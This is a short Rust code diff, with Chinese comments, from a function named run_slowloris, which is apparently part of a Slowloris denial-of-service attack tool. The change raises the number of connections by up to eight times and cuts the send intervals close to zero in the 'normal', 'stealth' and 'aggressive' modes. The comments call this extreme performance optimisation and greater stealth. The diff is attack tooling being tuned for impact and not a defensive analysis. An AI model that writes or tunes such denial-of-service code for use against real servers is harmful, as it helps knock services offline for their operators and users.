@@ -47,12 +47,12 @@ pub async fn run_slowloris(config: SlowlorisConfig) {
             .progress_chars("#>-"),
     );
 
-    // 根据攻击模式调整参数
+    // 根据攻击模式调整参数 - 极限性能优化
     let (connections, interval_range) = match config.mode.as_str() {
-        "normal" => (config.connections, config.min_interval..config.max_interval),
-        "stealth" => (config.connections / 2, (config.min_interval * 2)..(config.max_interval * 3)),
-        "aggressive" => (config.connections * 2, 1..config.max_interval / 2),
-        _ => (config.connections, config.min_interval..config.max_interval),
+        "normal" => (config.connections * 4, 1..config.max_interval / 8),                                 // 极限增加并发，极限减少间隔
+        "stealth" => (config.connections * 2, config.min_interval..config.max_interval),                  // 增加隐蔽性并发
+        "aggressive" => (config.connections * 8, 0..config.max_interval / 16),                            // 极限增加并发，极限减少间隔
+        _ => (config.connections * 4, 1..config.max_interval / 8),
     };
 
     println!("🎯 调整后的参数:");
